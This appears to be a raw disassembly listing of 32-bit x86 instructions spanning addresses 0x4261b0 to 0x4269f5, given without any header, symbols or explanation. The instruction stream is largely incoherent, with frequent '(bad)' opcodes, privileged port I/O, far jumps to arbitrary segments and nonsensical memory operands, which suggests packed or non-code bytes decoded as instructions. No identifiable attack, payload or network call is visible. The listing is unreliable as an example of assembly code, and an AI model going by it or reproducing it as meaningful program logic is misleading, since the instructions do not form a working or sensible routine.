  4261b0:	jle    0x426137
  4261b2:	pushf  
  4261b3:	hlt    
  4261b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261b5:	in     eax,0x1
  4261b7:	jne    0x4261bb
  4261b9:	push   ss
  4261ba:	ss cli 
  4261bc:	or     al,0xf5
  4261be:	sbb    BYTE PTR [edi],0xf6
  4261c1:	call   0xd885dfa
  4261c6:	adc    BYTE PTR [eax],al
  4261c8:	sbb    DWORD PTR [esi+0x46],ebx
  4261cb:	push   ebp
  4261cc:	aad    0xe8
  4261ce:	add    edx,ebp
  4261d0:	add    DWORD PTR [edx-0x17fd4fd4],esi
  4261d6:	add    esi,DWORD PTR [ebp+0x14]
  4261d9:	ror    DWORD PTR [esi-0x634a2141],0x80
  4261e0:	push   0xfffffff6
  4261e2:	inc    ebx
  4261e3:	jne    0x42621a
  4261e5:	adc    dl,BYTE PTR [edi]
  4261e7:	add    BYTE PTR [eax],al
  4261e9:	add    BYTE PTR [eax],al
  4261eb:	add    BYTE PTR [ebp+0x7d],bh
  4261ee:	adc    DWORD PTR [edi+0x33e0e6b9],ecx
  4261f4:	dec    ebp
  4261f5:	fisub  WORD PTR [ecx-0x63]
  4261f8:	mov    BYTE PTR cs:[ecx],ch
  4261fb:	sbb    BYTE PTR [ebx-0x5c53e583],dh
  426201:	(bad)  
  426202:	call   0xe4ccfc0a
  426207:	push   ss
  426208:	outs   dx,DWORD PTR ds:[esi]
  426209:	add    DWORD PTR [edx-0x2e7a82bc],ebx
  42620f:	sbb    ecx,DWORD PTR [ecx-0x626499f9]
  426215:	pop    ss
  426216:	(bad)  [esi-0x270019c7]
  42621c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42621d:	lea    esi,[ebp+eax*1-0x17]
  426221:	test   eax,0x8df9a5ec
  426226:	out    0xf9,eax
  426228:	add    eax,DWORD PTR [edi+0x24]
  42622b:	stc    
  42622c:	xchg   BYTE PTR [ebp-0x77393a8c],cl
  426232:	ret    0xdd91
  426235:	(bad)  
  426236:	sti    
  426237:	jle    0x426233
  426239:	ret    0xe574
  42623c:	gs jg  0x426283
  42623f:	lds    ebp,FWORD PTR [edx+0x25515041]
  426245:	dec    ebp
  426246:	add    cl,ch
  426248:	push   ecx
  426249:	sub    al,0xb0
  42624b:	call   0xad27eb9d
  426250:	add    BYTE PTR [eax],al
  426252:	add    BYTE PTR [eax],al
  426254:	add    BYTE PTR [edx+edi*8-0x6c126101],dh
  42625b:	sti    
  42625c:	mov    bh,0x7a
  42625e:	call   0xc77f:0x276ac04
  426265:	jp     0x426269
  426267:	jg     0x4261f8
  426269:	outs   dx,BYTE PTR ds:[esi]
  42626a:	add    bl,BYTE PTR [edx+0x2a]
  42626d:	std    
  42626e:	inc    ebp
  42626f:	and    al,0xed
  426271:	xor    BYTE PTR ds:0x14f31087,0x4
  426278:	jb     0x4262e2
  42627a:	jg     0x426290
  42627c:	push   0x640844fd
  426281:	jb     0x426206
  426283:	aaa    
  426284:	sbb    BYTE PTR [ecx+ecx*1+0x4075338d],al
  42628b:	call   0x451991
  426290:	ret    0xe073
  426293:	mov    edi,0xb163965
  426298:	add    BYTE PTR [ebx],dh
  42629a:	cmp    eax,0xfe9b8b08
  42629f:	shl    al,0xde
  4262a2:	aam    0xe7
  4262a4:	inc    ebx
  4262a5:	cwde   
  4262a6:	push   es
  4262a7:	add    BYTE PTR [edi+0x32],bl
  4262aa:	enter  0x4,0x47
  4262ae:	shl    BYTE PTR [ebx],cl
  4262b0:	add    al,0x8a
  4262b2:	loope  0x42627d
  4262b4:	pusha  
  4262b5:	mov    eax,DWORD PTR [ecx+0x8bf9]
  4262bb:	add    BYTE PTR [eax],al
  4262bd:	add    BYTE PTR [ebx+0x7cc062fe],cl
  4262c3:	jnp    0x426334
  4262c5:	add    al,0x17
  4262c7:	cld    
  4262c8:	cli    
  4262c9:	ror    BYTE PTR [edi-0x412ecc3b],1
  4262cf:	dec    DWORD PTR [edx+ecx*2-0x2a182944]
  4262d6:	fld    DWORD PTR [eax+eax*1]
  4262d9:	jmp    0x426269
  4262db:	mov    dh,0xbb
  4262dd:	test   BYTE PTR [edx+esi*8+0x6],cl
  4262e1:	jmp    DWORD PTR [ebx]
  4262e3:	cld    
  4262e4:	cmp    BYTE PTR [edi+0x54],0xe1
  4262e8:	mul    BYTE PTR [eax+0xb]
  4262eb:	pop    esp
  4262ec:	add    BYTE PTR [esp+ecx*2+0x4],al
  4262f0:	push   edi
  4262f1:	pop    esi
  4262f2:	sahf   
  4262f3:	add    al,BYTE PTR [eax]
  4262f5:	mov    ebx,DWORD PTR [eax]
  4262f7:	mov    al,0xff
  4262f9:	cmp    cl,BYTE PTR ds:0xc5116afc
  4262ff:	inc    ebp
  426300:	or     BYTE PTR [ebx+0x5c],ch
  426303:	out    0x4d,al
  426305:	push   eax
  426306:	xchg   ecx,eax
  426307:	cmc    
  426308:	add    ebp,eax
  42630a:	outs   dx,BYTE PTR ds:[esi]
  42630b:	inc    edi
  42630c:	add    BYTE PTR [eax],al
  42630e:	mov    dl,0xc8
  426310:	add    al,0x0
  426312:	xchg   DWORD PTR [esi],edi
  426314:	sbb    BYTE PTR [ebx+0x10969a75],cl
  42631a:	inc    esi
  42631b:	bound  edi,QWORD PTR [ebx-0x40]
  42631e:	push   0x2e
  426320:	les    ecx,FWORD PTR [ebp+0x0]
  426326:	add    BYTE PTR [eax+edx*2],dh
  426329:	ret    0x61fb
  42632c:	std    
  42632d:	inc    DWORD PTR [esi+0x18ab12c]
  426333:	inc    edi
  426334:	push   0x5286042f
  426339:	jnp    0x4262fb
  42633b:	jp     0x42634b
  42633d:	les    ecx,FWORD PTR [ebp+0x4c58034]
  426343:	jne    0x4262cd
  426345:	or     esp,DWORD PTR [ecx+edi*2]
  426348:	adc    al,0x4c
  42634a:	sbb    dh,bh
  42634c:	call   0xc8d2:0xa145fb35
  426353:	icebp  
  426354:	fld    DWORD PTR ds:0x441eb495
  42635a:	sti    
  42635b:	mov    bh,0x9d
  42635d:	(bad)  
  42635e:	cli    
  42635f:	or     DWORD PTR ds:0xa12c8700,eax
  426365:	mov    al,BYTE PTR [ecx]
  426367:	(bad)  
  426368:	shr    BYTE PTR [esi],1
  42636a:	or     al,0xa6
  42636c:	loop   0x4263e8
  42636e:	shl    BYTE PTR [edx+0x36],0xc4
  426372:	lea    esi,[eax+ebp*8+0x147504c4]
  426379:	dec    esp
  42637a:	sbb    dh,bh
  42637c:	cdq    
  42637d:	xchg   esi,eax
  42637e:	push   eax
  42637f:	lods   al,BYTE PTR gs:[esi]
  426381:	int3   
  426382:	test   BYTE PTR ds:0xc17098,dh
  426388:	pop    edx
  426389:	xchg   esi,eax
  42638a:	mov    edi,0x0
  42638f:	add    BYTE PTR [edx],ch
  426391:	or     eax,0x61ee03db
  426396:	test   DWORD PTR [esi-0x66c8fd8c],0xcb15f6a5
  4263a0:	icebp  
  4263a1:	shl    edx,0x6e
  4263a4:	xor    al,0x7d
  4263a6:	sub    BYTE PTR [ecx-0x7316fa45],bl
  4263ac:	cmp    al,0xea
  4263ae:	ins    DWORD PTR es:[edi],dx
  4263af:	add    ebp,esi
  4263b1:	xor    ecx,edx
  4263b3:	aam    0xad
  4263b5:	test   DWORD PTR [ecx+0x74c10009],ebp
  4263bb:	inc    ebx
  4263bc:	into   
  4263bd:	ret    0x3433
  4263c0:	clc    
  4263c1:	push   ss
  4263c2:	stc    
  4263c3:	shl    BYTE PTR [esi-0x5e],0x5f
  4263c7:	inc    esp
  4263c8:	jne    0x426443
  4263ca:	sub    cl,BYTE PTR [ebx*4-0x5166f097]
  4263d1:	js     0x4263c5
  4263d3:	jmp    0x42638c
  4263d5:	inc    esi
  4263d6:	mov    ecx,0xe9445977
  4263db:	shl    BYTE PTR [esi],0xd6
  4263de:	mov    bl,al
  4263e0:	dec    eax
  4263e1:	add    ch,BYTE PTR [edx]
  4263e3:	inc    ecx
  4263e4:	cmp    eax,0x75460dba
  4263e9:	(bad)  
  4263ea:	stos   BYTE PTR es:[edi],al
  4263eb:	xlat   BYTE PTR ds:[ebx]
  4263ec:	push   eax
  4263ed:	iret   
  4263ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263ef:	add    esi,DWORD PTR [esi]
  4263f1:	inc    esi
  4263f2:	test   eax,0x97
  4263f7:	add    BYTE PTR [eax],al
  4263f9:	mov    eax,ds:0xb6c0e940
  4263fe:	inc    esi
  4263ff:	repnz (bad) 
  426401:	nop
  426402:	add    ah,BYTE PTR [edx]
  426404:	inc    ecx
  426405:	mov    ebp,0x7545d3db
  42640a:	jns    0x42642e
  42640c:	cmp    bh,dl
  42640e:	xchg   esp,eax
  42640f:	lods   eax,DWORD PTR ds:[esi]
  426410:	fbstp  TBYTE PTR [esi+0x3]
  426413:	xchg   ebx,eax
  426414:	mov    WORD PTR [esi+eax*8],fs
  426417:	add    bh,ch
  426419:	(bad)  
  42641a:	test   BYTE PTR [eax-0x17],al
  42641d:	push   0x0
  42641f:	push   edx
  426420:	rcl    DWORD PTR [eax-0x33],1
  426423:	(bad)  
  426424:	call   0xab9d2522
  426429:	add    cl,BYTE PTR [esi-0x4cf1755]
  42642f:	(bad)  
  426430:	js     0x4264a9
  426432:	dec    ebp
  426433:	jg     0x4263f3
  426435:	(bad)  
  426436:	pop    ds
  426437:	add    eax,0x7208fd6a
  42643c:	loop   0x426431
  42643e:	and    DWORD PTR [eax-0x5a],0xa17f89ed
  426445:	lea    edx,[ecx]
  426447:	add    al,0xf
  426449:	lock sar DWORD PTR [edi-0x184a9e],0xe8
  426451:	jbe    0x4263dc
  426453:	cmp    eax,0x10276e9
  426458:	std    
  426459:	int3   
  42645a:	xor    BYTE PTR [edi],ch
  42645c:	ja     0x42645e
  42645e:	add    BYTE PTR [eax],al
  426460:	add    BYTE PTR [eax],al
  426462:	aas    
  426463:	add    edi,edi
  426465:	call   0x1846e3e0
  42646a:	push   cs
  42646b:	in     eax,0xbd
  42646d:	cmp    dh,bl
  42646f:	stc    
  426470:	mov    dl,0xf5
  426472:	sti    
  426473:	loope  0x4264c5
  426475:	test   eax,0xbad2d576
  42647a:	imul   edi,DWORD PTR [esi+0x70],0xffffffe8
  42647e:	adc    DWORD PTR [edi],eax
  426480:	jb     0x426464
  426482:	repz cmp ebx,edi
  426485:	loop   0x4264c3
  426487:	pminub mm3,mm2
  42648a:	sub    BYTE PTR ss:[edi-0x7afa0e71],bh
  426491:	retf   
  426492:	xchg   DWORD PTR [edx+0x0],eax
  426495:	add    dl,bl
  426497:	lds    edx,FWORD PTR [ebp-0x75]
  42649a:	js     0x42646c
  42649c:	dec    edx
  42649d:	push   edi
  42649e:	xchg   edi,eax
  42649f:	imul   ebp,DWORD PTR [ebx],0xbcbe4c0
  4264a5:	setno  dh
  4264a8:	dec    eax
  4264a9:	and    eax,0xc000011c
  4264ae:	xchg   ebp,eax
  4264af:	inc    ebx
  4264b0:	cld    
  4264b1:	xor    cl,ah
  4264b3:	add    al,0xae
  4264b5:	enter  0xaa75,0xcc
  4264b9:	inc    eax
  4264ba:	mov    DWORD PTR [esi+0x0],eax
  4264bd:	je     0x426454
  4264bf:	je     0x426481
  4264c1:	cmp    al,0x84
  4264c3:	lock in eax,0x33
  4264c6:	add    BYTE PTR [eax],al
  4264c8:	add    BYTE PTR [eax],al
  4264ca:	add    BYTE PTR [edi-0x24247b15],dh
  4264d0:	or     al,0x90
  4264d2:	add    ah,cl
  4264d4:	add    bh,dh
  4264d6:	jne    0x426470
  4264d8:	jp     0x426495
  4264da:	mov    ebp,edx
  4264dc:	pop    ebp
  4264dd:	mov    ebx,DWORD PTR cs:[eax+eax*1-0x27d849f9]
  4264e5:	call   DWORD PTR [esi+0xb]
  4264e8:	xchg   ebx,eax
  4264e9:	rcl    DWORD PTR [ebx],cl
  4264eb:	fadd   QWORD PTR [eax]
  4264ed:	test   eax,eax
  4264ef:	mov    al,ds:0x4cb606fd
  4264f4:	(bad)  
  4264f5:	loopne 0x426507
  4264f7:	xchg   ebp,eax
  4264f8:	inc    ecx
  4264f9:	cld    
  4264fa:	mov    esp,DWORD PTR [edx]
  4264fc:	nop
  4264fd:	icebp  
  4264fe:	inc    eax
  4264ff:	dec    esi
  426500:	xor    BYTE PTR [ecx+ebp*1-0x5e],0x46
  426505:	adc    DWORD PTR [eax+0x1aba121],eax
  42650b:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  42650d:	push   es
  42650e:	mov    dh,0x9c
  426510:	add    ebp,DWORD PTR [esi+0x40de750c]
  426516:	pop    ebp
  426517:	mov    ch,0x99
  426519:	add    dh,BYTE PTR [edx+0x5d3fde79]
  42651f:	mov    ch,0x99
  426521:	sbb    eax,0x1da214c1
  426526:	pop    es
  426527:	sub    eax,0x1ed94aad
  42652c:	jp     0x4264ff
  42652e:	mov    edi,0x0
  426533:	add    BYTE PTR [esi+0x52],al
  426536:	xlat   BYTE PTR ds:[ebx]
  426537:	dec    esp
  426538:	jno    0x426567
  42653a:	add    al,BYTE PTR [ebp+esi*1+0xc170ad]
  426541:	sahf   
  426542:	mov    BYTE PTR [eax],al
  426544:	je     0x4264df
  426546:	jmp    esi
  426548:	jno    0x426567
  42654a:	mov    edi,0x885b000b
  42654f:	add    al,0x0
  426551:	fwait
  426552:	add    al,0x0
  426554:	jne    0x4265c2
  426556:	adc    ah,bh
  426558:	sub    cl,cl
  42655a:	xchg   edx,eax
  42655b:	jne    0x4265ca
  42655d:	jl     0x42654f
  42655f:	jmp    0x4264e7
  426561:	fld    DWORD PTR [ebx]
  426563:	repz int 0xa0
  426566:	mov    edi,0xcf80bdf3
  42656b:	jg     0x426585
  42656d:	lods   eax,DWORD PTR ds:[esi]
  42656e:	push   DWORD PTR [ebx+0x5d]
  426571:	xor    ebp,eax
  426573:	cli    
  426574:	mov    ch,BYTE PTR [edx+eax*1]
  426577:	mov    bl,0xb5
  426579:	mov    ebx,0x9001c080
  42657e:	xchg   BYTE PTR [edx-0x7b],cl
  426581:	retf   
  426582:	inc    ebx
  426583:	push   cs
  426584:	cmc    
  426585:	push   esp
  426586:	cli    
  426587:	xor    BYTE PTR [eax+0x75fffed5],0xf9
  42658e:	xchg   edx,eax
  42658f:	jne    0x4265e2
  426591:	add    bh,BYTE PTR [ecx-0x16fdb4d5]
  426597:	add    eax,DWORD PTR [eax]
  426599:	add    BYTE PTR [eax],al
  42659b:	add    BYTE PTR [eax],al
  42659d:	pop    edx
  42659e:	rcl    edi,0xc3
  4265a1:	sahf   
  4265a2:	daa    
  4265a3:	and    cl,al
  4265a5:	jge    0x4265a9
  4265a7:	outs   dx,BYTE PTR ds:[esi]
  4265a8:	or     cl,bl
  4265aa:	mov    bl,0xa6
  4265ac:	add    eax,edi
  4265ae:	iret   
  4265af:	sub    BYTE PTR [esi],ch
  4265b1:	lock mov eax,0xccfbe375
  4265b7:	js     0x426567
  4265b9:	dec    edx
  4265ba:	add    ch,BYTE PTR [esi-0x53]
  4265bd:	cli    
  4265be:	iret   
  4265bf:	or     eax,0x53fe5110
  4265c4:	push   DWORD PTR [ebx-0x74]
  4265c7:	ret    0x7b0f
  4265ca:	inc    edx
  4265cb:	push   0xe8fa6dc2
  4265d0:	add    esp,DWORD PTR [edx-0x5d53c83f]
  4265d6:	ret    0x3642
  4265d9:	or     eax,DWORD PTR [esi]
  4265db:	jmp    0xe13c1b0a
  4265e0:	add    esi,DWORD PTR [ebp-0x1]
  4265e3:	mov    eax,ds:0xf476a4a9
  4265e8:	addr16 (bad) 
  4265ea:	ds jmp 0x7211ac1d
  4265f0:	rcr    edx,1
  4265f2:	test   BYTE PTR [eax-0x388a8f0],ah
  4265f8:	jae    0x4265a1
  4265fa:	ds jmp 0x13c0f988
  426600:	xchg   ebp,eax
  426601:	add    BYTE PTR [eax],al
  426603:	add    BYTE PTR [eax],al
  426605:	add    BYTE PTR [ecx],al
  426607:	std    
  426608:	test   al,0x82
  42660a:	aaa    
  42660b:	sti    
  42660c:	lock add esi,DWORD PTR [ebp-0x33]
  426610:	daa    
  426611:	adc    ah,BYTE PTR [ebp-0x62]
  426614:	add    ch,ah
  426616:	pop    edx
  426618:	or     cl,ah
  42661a:	jbe    0x42661e
  42661c:	jmp    FWORD PTR [edx]
  42661e:	cld    
  42661f:	mov    dh,BYTE PTR [ebp-0x32]
  426622:	mov    bh,0x1b
  426624:	leave  
  426625:	loope  0x426695
  426627:	add    al,BYTE PTR [eax]
  426629:	dec    edi
  42662a:	test   eax,0xdee93fb4
  42662f:	gs inc eax
  426631:	jmp    0x7e02e4ac
  426636:	push   ss
  426637:	cmp    DWORD PTR ds:0xffc9e33d,0x7fae04f
  426641:	jmp    0x8547f3bc
  426646:	enter  0xffc9,0xe9
  42664a:	retf   
  42664b:	jns    0x42661f
  42664d:	sub    dh,BYTE PTR [ecx+0xe]
  426650:	add    dh,BYTE PTR [edx-0x5e]
  426653:	fimul  WORD PTR [ebx]
  426655:	pusha  
  426656:	fld    DWORD PTR [eax+0x488b0ec3]
  42665c:	add    al,0xe9
  42665e:	push   edi
  42665f:	push   esi
  426660:	shr    BYTE PTR [edx],cl
  426662:	jns    0x426699
  426664:	xchg   DWORD PTR [ecx+0x2874c23b],edx
  42666a:	add    BYTE PTR [eax],al
  42666c:	add    BYTE PTR [eax],al
  42666e:	add    ah,bh
  426670:	out    dx,eax
  426671:	(bad)  
  426672:	lahf   
  426673:	xor    eax,0x4fb18702
  426678:	mov    ebx,0x276e108
  42667d:	lea    ebx,[ebp-0x79]
  426680:	xchg   ecx,eax
  426681:	repz data16 loope 0x42668e
  426685:	cmp    DWORD PTR [esi+0x73],ebx
  426688:	sti    
  426689:	add    BYTE PTR [eax+0x6e],0xfa
  42668d:	(bad)  
  42668e:	call   0x130764c
  426693:	ja     0x4266fb
  426695:	je     0x4266b1
  426697:	out    0xbe,eax
  426699:	imul   ecx,ecx,0xfffffd54
  42669f:	jmp    0xe805:0x1fd6902e
  4266a6:	ss or  al,0x5
  4266a9:	add    BYTE PTR [ecx+0x43ce2121],cl
  4266af:	sbb    al,0xcf
  4266b1:	push   esi
  4266b2:	ret    
  4266b3:	or     DWORD PTR [edx-0x14],edi
  4266b6:	push   ebx
  4266b7:	mov    bh,0x19
  4266b9:	into   
  4266ba:	inc    ebx
  4266bb:	or     al,0xd2
  4266bd:	not    BYTE PTR ds:0x3b9324
  4266c3:	lahf   
  4266c4:	repz pop es
  4266c6:	call   DWORD PTR [ebx]
  4266c8:	or     edi,0x7b050c00
  4266ce:	jge    0x4266a0
  4266d0:	add    al,0x7
  4266d2:	test   BYTE PTR [eax],al
  4266d4:	add    BYTE PTR [eax],al
  4266d6:	add    BYTE PTR [eax],al
  4266d8:	and    esi,edi
  4266da:	(bad)  
  4266db:	dec    DWORD PTR [edi-0xd]
  4266de:	lldt   bx
  4266e1:	cmp    BYTE PTR [ebx-0x8fb2400],0x75
  4266e8:	les    ebp,FWORD PTR [edx+eax*8-0x2]
  4266ec:	jecxz  0x426762
  4266ee:	test   eax,eax
  4266f0:	pop    ecx
  4266f1:	mov    ?,esi
  4266f3:	jne    0x426689
  4266f5:	ins    BYTE PTR es:[edi],dx
  4266f6:	std    
  4266f7:	(bad)  
  4266f8:	repz je 0x426680
  4266fb:	rcl    BYTE PTR [ebx-0x73ff6080],0x4
  426702:	out    dx,al
  426703:	inc    ebp
  426704:	test   al,0xfd
  426706:	dec    ebp
  426707:	push   edi
  426708:	test   al,0x2
  42670a:	lea    edi,[eax+0x9a]
  426710:	jne    0x426730
  426712:	push   esp
  426713:	add    bh,BYTE PTR [ebp-0x67]
  426716:	jmp    esi
  426718:	jl     0x426728
  42671a:	or     al,0x4
  42671c:	lock or DWORD PTR [eax],ecx
  42671f:	add    al,0x75
  426721:	cdq    
  426722:	cmp    BYTE PTR [ebp+0x65],0x99
  426726:	jp     0x42676d
  426728:	jns    0x42673c
  42672a:	dec    ecx
  42672b:	or     bl,cl
  42672d:	push   0x4d
  42672f:	add    BYTE PTR [edi-0x67],dh
  426732:	(bad)  
  426733:	cmp    al,cl
  426735:	mov    DWORD PTR [edx],edx
  426737:	add    al,0x7a
  426739:	enter  0x1038,0x0
  42673d:	add    BYTE PTR [eax],al
  42673f:	add    BYTE PTR [eax],al
  426741:	jb     0x426713
  426743:	add    eax,0x2f3e20b
  426748:	mov    edi,0x399cc
  42674d:	jne    0x426733
  42674f:	les    esi,FWORD PTR [edx+0x67]
  426752:	hlt    
  426753:	les    esp,FWORD PTR [edx+0x4c]
  426756:	xchg   edi,eax
  426757:	(bad)  
  426758:	mov    dl,0x83
  42675a:	retf   0xc302
  42675d:	inc    ebp
  42675e:	call   0x9977ecfe
  426763:	dec    DWORD PTR [edx]
  426765:	and    bl,BYTE PTR [eax-0x5eb704ce]
  42676b:	add    al,bl
  42676d:	and    eax,0x75401971
  426772:	cdq    
  426773:	sub    DWORD PTR [ecx],eax
  426775:	arpl   WORD PTR [edi+ebp*8-0x160a39f],ax
  42677c:	mov    dl,0x7b
  42677e:	jmp    0x619b:0xf045c302
  426785:	xor    eax,0xca0aff99
  42678a:	lahf   
  42678b:	sbb    eax,0x51022200
  426790:	push   es
  426791:	stc    
  426792:	add    ch,cl
  426794:	mov    BYTE PTR [ebp-0x2ffbb7f3],dh
  42679a:	cli    
  42679b:	push   DWORD PTR [eax]
  42679d:	test   DWORD PTR ds:0xb0094e5d,ecx
  4267a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4267a4:	add    eax,DWORD PTR [eax]
  4267a6:	add    BYTE PTR [eax],al
  4267a8:	add    BYTE PTR [eax],al
  4267aa:	stos   BYTE PTR es:[edi],al
  4267ab:	xchg   esp,ebx
  4267ad:	out    dx,eax
  4267ae:	add    BYTE PTR [edx-0x17],0x32
  4267b2:	scas   eax,DWORD PTR es:[edi]
  4267b3:	fwait
  4267b4:	jmp    0x7af5:0xfced3e36
  4267bb:	add    ch,BYTE PTR [esi-0x170e0cd0]
  4267c1:	cmp    bh,al
  4267c3:	pop    es
  4267c4:	in     eax,dx
  4267c5:	sahf   
  4267c6:	jge    0x4267e8
  4267c8:	ror    BYTE PTR [ecx+0x3e8fe71],1
  4267ce:	jle    0x42681f
  4267d0:	pop    ebx
  4267d1:	pop    es
  4267d2:	jno    0x4267d6
  4267d4:	jmp    0x3a026a0b
  4267d9:	cmp    DWORD PTR ds:0x750428f2,ecx
  4267df:	not    DWORD PTR [ecx-0x17018e76]
  4267e5:	add    ebx,DWORD PTR [ebx+0x1]
  4267e8:	adc    bl,BYTE PTR [edi+ecx*1-0x7fc167d]
  4267ef:	shl    DWORD PTR [edi+esi*4],0x2e
  4267f3:	ret    
  4267f4:	cmp    dl,BYTE PTR [ecx-0x17]
  4267f7:	scas   eax,DWORD PTR es:[edi]
  4267f8:	es add al,0x26
  4267fb:	xchg   esp,edi
  4267fd:	jmp    0x42677f
  4267ff:	inc    edx
  426800:	jmp    0xf1209189
  426805:	nop
  426806:	sub    eax,esi
  426808:	jns    0x426822
  42680a:	push   ecx
  42680b:	cli    
  42680c:	inc    DWORD PTR [eax+0x0]
  426812:	add    BYTE PTR [eax],ch
  426814:	test   ebx,edi
  426816:	outs   dx,BYTE PTR ds:[esi]
  426817:	repnz shl DWORD PTR [eax+esi*8+0x3c],0x7f
  42681d:	lock push ecx
  42681f:	or     eax,0xa756fb8b
  426824:	xor    ebx,edi
  426826:	hlt    
  426827:	pop    edx
  426828:	clc    
  426829:	aas    
  42682a:	jmp    0xe946acd4
  42682f:	dec    BYTE PTR [edi-0x57]
  426832:	jmp    0xb602e6ad
  426837:	mov    cl,0x30
  426839:	push   ebx
  42683a:	mov    bp,0x3fb0
  42683e:	jmp    0xf157f1c0
  426843:	sub    dh,al
  426845:	dec    DWORD PTR ds:0x110bde8d
  42684b:	jo     0x4267d4
  42684d:	sti    
  42684e:	(bad)  
  42684f:	cdq    
  426850:	xchg   edx,eax
  426851:	test   edi,edi
  426853:	push   0xffffffe7
  426855:	out    0x7c,eax
  426857:	in     eax,0x89
  426859:	sti    
  42685a:	push   0x74
  42685c:	mov    DWORD PTR [edi],ebp
  42685e:	test   eax,0xed827b4c
  426863:	jp     0x426867
  426865:	add    BYTE PTR [edi+0x6e],al
  426868:	add    BYTE PTR [edx],0xf1
  42686b:	jbe    0x42686f
  42686d:	call   0xfbcc6d62
  426872:	push   ds
  426873:	in     al,0xef
  426875:	sbb    ebx,ebx
  426877:	add    BYTE PTR [eax],al
  426879:	add    BYTE PTR [eax],al
  42687b:	add    BYTE PTR [esi],dh
  42687d:	add    bl,BYTE PTR [ebx+0x47]
  426880:	in     al,0xdf
  426882:	xor    esi,edi
  426884:	add    dl,BYTE PTR ss:[ebp+0x62]
  426888:	adc    dh,BYTE PTR [ecx]
  42688a:	sti    
  42688b:	adc    al,0xad
  42688d:	mov    BYTE PTR [ebp+0x0],dh
  426890:	mov    esp,0x1b0c7572
  426895:	in     al,dx
  426896:	pop    es
  426897:	push   DWORD PTR [ecx-0x63bfee47]
  42689d:	push   es
  42689e:	lock test DWORD PTR [edx],esp
  4268a1:	repz push cs
  4268a3:	call   0x42917b
  4268a8:	loopne 0x42686b
  4268aa:	je     0x4268ba
  4268ac:	add    BYTE PTR ss:[esi-0x1],cl
  4268b0:	and    DWORD PTR [ebp+0x696475f6],eax
  4268b6:	push   cs
  4268b7:	dec    BYTE PTR [ebx-0x5397c8e]
  4268bd:	sar    DWORD PTR [ecx-0x7d33b3f0],cl
  4268c3:	in     al,dx
  4268c4:	add    al,BYTE PTR [esi]
  4268c6:	jne    0x4268dc
  4268c8:	repz jno 0x426940
  4268cb:	and    BYTE PTR [edi-0x5e00f40c],dl
  4268d1:	xchg   ebp,eax
  4268d2:	div    BYTE PTR [ebp+0x14]
  4268d5:	retf   
  4268d6:	div    BYTE PTR [ebp+0x2c]
  4268d9:	retf   0x75f6
  4268dc:	adc    al,0x72
  4268de:	adc    eax,0xf4
  4268e3:	add    BYTE PTR [eax],al
  4268e5:	add    DWORD PTR [ecx+0x0],eax
  4268e8:	mov    DWORD PTR [ecx-0x6e],edx
  4268eb:	test   al,al
  4268ed:	push   ecx
  4268ee:	ds test esi,esi
  4268f1:	inc    eax
  4268f2:	mov    dl,0xe3
  4268f4:	cld    
  4268f5:	add    al,0xfe
  4268f7:	inc    DWORD PTR [ebx-0x74d515f4]
  4268fd:	ror    bh,cl
  4268ff:	sub    bl,bl
  426901:	push   ecx
  426902:	ins    BYTE PTR es:[edi],dx
  426903:	je     0x42692e
  426905:	xlat   BYTE PTR ds:[ebx]
  426906:	ror    DWORD PTR [edi],1
  426908:	jae    0x4268ba
  42690a:	pop    es
  42690b:	add    al,0xdf
  42690d:	jne    0x426931
  42690f:	dec    ecx
  426910:	and    BYTE PTR [esi+0x5d],ch
  426913:	push   cs
  426914:	(bad)  
  426915:	in     eax,dx
  426916:	test   edi,ebx
  426918:	gs je  0x42691f
  42691b:	sbb    DWORD PTR [eax],esp
  42691d:	xchg   edx,eax
  42691e:	xchg   BYTE PTR [edx-0x87275fc],ch
  426924:	out    0xd0,eax
  426926:	sbb    eax,0xf036fb8b
  42692b:	sbb    BYTE PTR [eax],ah
  42692d:	call   0xb0c98ff6
  426932:	xchg   ebp,eax
  426933:	sub    bl,BYTE PTR [edx-0x40]
  426936:	xlat   BYTE PTR ds:[ebx]
  426937:	out    dx,eax
  426938:	inc    ecx
  42693a:	adc    BYTE PTR [eax-0xcb8adae],ah
  426940:	cli    
  426941:	shr    BYTE PTR [ecx-0x238e8a76],0x18
  426948:	or     BYTE PTR [eax],al
  42694a:	add    BYTE PTR [eax],al
  42694c:	add    BYTE PTR [eax],al
  42694e:	cmp    cl,BYTE PTR [edi-0x664aee21]
  426954:	jbe    0x426946
  426956:	lock jmp 0x426964
  426959:	and    eax,0x5c210d
  42695e:	jne    0x42697d
  426960:	les    esi,FWORD PTR [ecx+esi*2+0x16]
  426964:	xchg   edx,eax
  426965:	jne    0x4269e6
  426967:	xchg   esp,eax
  426968:	sbb    BYTE PTR [eax],cl
  42696a:	or     eax,0xfafb8d7e
  42696f:	mov    al,0xfd
  426971:	gs jne 0x426937
  426974:	mov    dh,BYTE PTR [ebp+0x79]
  426977:	mov    ah,0x18
  426979:	or     ch,cl
  42697b:	fst    QWORD PTR [eax-0x3aef2505]
  426981:	pop    edx
  426982:	xor    BYTE PTR [edi-0x11],dl
  426985:	jmp    DWORD PTR [ecx]
  426987:	and    BYTE PTR [ebx+0x6e022b4f],bl
  42698d:	sbb    BYTE PTR [ecx+0x2b],ah
  426990:	call   0xae00:0x14775518
  426997:	or     eax,0xea288eed
  42699c:	sbb    cl,BYTE PTR [edi-0x70ee0de0]
  4269a2:	or     dl,bh
  4269a4:	jno    0x42699e
  4269a6:	call   0x53d:0xec0428ed
  4269ad:	mov    DWORD PTR [ebp+0x88a90d],esi
  4269b3:	add    BYTE PTR [eax],al
  4269b5:	add    BYTE PTR [eax],al
  4269b7:	addr16 push cs
  4269b9:	mov    dl,0x9b
  4269bb:	mov    ah,0x5a
  4269bd:	jmp    0xbe0462c5
  4269c2:	xor    eax,0xaaf5cbf2
  4269c7:	clc    
  4269c8:	mov    edi,DWORD PTR [ebp-0x26da7dc3]
  4269ce:	adc    ch,BYTE PTR [edi+esi*2+0x3cecaeed]
  4269d5:	leave  
  4269d6:	retf   0x1034
  4269d9:	out    0x7c,al
  4269db:	mov    al,ds:0x1e037ee2
  4269e0:	or     eax,0xa3a18ec9
  4269e5:	in     eax,0x8e
  4269e7:	mov    dl,bh
  4269e9:	add    BYTE PTR [edx+0x41ea8309],dl
  4269ef:	pop    edx
  4269f0:	or     eax,0x97261709
  4269f5:	push   es
